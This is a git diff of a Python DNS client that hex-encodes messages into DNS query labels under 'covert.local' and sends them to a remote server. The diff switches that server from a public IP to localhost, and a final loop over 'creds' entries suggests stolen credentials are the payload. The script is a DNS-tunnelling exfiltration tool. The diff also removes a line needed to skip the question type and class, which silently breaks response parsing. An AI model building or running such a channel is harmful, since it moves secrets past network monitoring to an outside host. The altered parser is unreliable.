@@ -32,14 +32,13 @@ class DNSClient:
         if self.sock:
             self.sock.close()
         self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        self.sock.settimeout(5.0)  # 5 second timeout
+        self.sock.settimeout(5.0)
     
     def test_connection(self):
         """Test if we can reach the DNS server"""
         print(f"\n[*] Testing connection to {self.server_ip}:{self.server_port}...")
         
         try:
-            # Send a simple DNS query
             test_query = self.create_dns_query(f"test.{self.domain}")
             
             print(f"[*] Sending test packet ({len(test_query)} bytes)...")
@@ -75,17 +74,14 @@ class DNSClient:
             True if successful, False otherwise
         """
         try:
-            # Encode message as hex
             hex_message = message.encode('utf-8').hex()
             
-            # Split into DNS labels (max 63 chars per label)
             labels = []
             max_label_len = 63
             
             for i in range(0, len(hex_message), max_label_len):
                 labels.append(hex_message[i:i+max_label_len])
             
-            # Create full domain name
             query_name = '.'.join(labels) + '.' + self.domain
             
             print(f"\n{'=' * 60}")
@@ -95,16 +91,13 @@ class DNSClient:
             print(f"[*] DNS query: {query_name}")
             print(f"[*] Destination: {self.server_ip}:{self.server_port}")
             
-            # Create DNS query
             query = self.create_dns_query(query_name)
             print(f"[*] Query packet size: {len(query)} bytes")
             
-            # Send query
             print(f"[*] Sending packet...")
             bytes_sent = self.sock.sendto(query, (self.server_ip, self.server_port))
             print(f"[+] Sent {bytes_sent} bytes")
             
-            # Wait for response
             print(f"[*] Waiting for response...")
             try:
                 response, addr = self.sock.recvfrom(512)
@@ -127,31 +120,25 @@ class DNSClient:
     
     def create_dns_query(self, domain_name):
         """Create DNS query packet"""
-        # Increment transaction ID
         self.transaction_id = (self.transaction_id + 1) % 65536
         
-        # DNS Header
-        query = struct.pack('!H', self.transaction_id)  # Transaction ID
+        query = struct.pack('!H', self.transaction_id)
         
-        # Flags: Standard query, recursion desired
         flags = 0x0100
         query += struct.pack('!H', flags)
         
-        # Questions: 1, Answers: 0, Authority: 0, Additional: 0
-        query += struct.pack('!H', 1)  # QDCOUNT
-        query += struct.pack('!H', 0)  # ANCOUNT
-        query += struct.pack('!H', 0)  # NSCOUNT
-        query += struct.pack('!H', 0)  # ARCOUNT
+        query += struct.pack('!H', 1)
+        query += struct.pack('!H', 0)
+        query += struct.pack('!H', 0)
+        query += struct.pack('!H', 0) 
         
-        # Question section
         for label in domain_name.split('.'):
             query += bytes([len(label)])
             query += label.encode('utf-8')
-        query += b'\x00'  # End of domain name
+        query += b'\x00' 
         
-        # Type A (1), Class IN (1)
-        query += struct.pack('!H', 1)  # QTYPE
-        query += struct.pack('!H', 1)  # QCLASS
+        query += struct.pack('!H', 1)
+        query += struct.pack('!H', 1)
         
         return query
     
@@ -161,13 +148,11 @@ class DNSClient:
             print("[!] Invalid response (too short)")
             return
         
-        # Parse header
         transaction_id = struct.unpack('!H', response[0:2])[0]
         flags = struct.unpack('!H', response[2:4])[0]
         qdcount = struct.unpack('!H', response[4:6])[0]
         ancount = struct.unpack('!H', response[6:8])[0]
         
-        # Check response code
         rcode = flags & 0x000F
         if rcode == 0:
             print("[+] DNS query successful (NOERROR)")
@@ -184,23 +169,18 @@ class DNSClient:
         if ancount > 0:
             print(f"[+] Received {ancount} answer(s)")
             
-            # Skip question section to get to answers
             pos = 12
             for _ in range(qdcount):
-                # Skip question name
                 while pos < len(response) and response[pos] != 0:
-                    if response[pos] >= 192:  # Compression pointer
+                    if response[pos] >= 192:
                         pos += 2
                         break
                     else:
                         pos += response[pos] + 1
                 else:
                     pos += 1
-                pos += 4  # Skip QTYPE and QCLASS
             
-            # Parse answer
             if pos < len(response):
-                # Skip name (usually a pointer)
                 if response[pos] >= 192:
                     pos += 2
                 else:
@@ -210,7 +190,7 @@ class DNSClient:
                 
                 if pos + 10 <= len(response):
                     answer_type = struct.unpack('!H', response[pos:pos+2])[0]
-                    pos += 8  # Skip type, class, TTL
+                    pos += 8  
                     data_len = struct.unpack('!H', response[pos:pos+2])[0]
                     pos += 2
                     
@@ -230,12 +210,11 @@ def main():
     print("=" * 70)
     print()
 
-    server_ip = "65.2.29.23"
+    server_ip = "127.0.0.1"
     server_port = 5353
     domain = "covert.local"
     client = DNSClient(server_ip=server_ip, server_port=server_port, domain=domain)
     
-    # Test connection first
     if not client.test_connection():
         print("\n[!] Connection test failed!")
         print("\nTroubleshooting steps:")
@@ -260,7 +239,6 @@ def main():
     
     for i in creds:
         def defang_url(url):
-        # Replace dots with [.] and http with hXXp
             return url.replace("http", "hXXp").replace(".", "[.]")
         url = i['url']
         safeurl = defang_url(url=url)
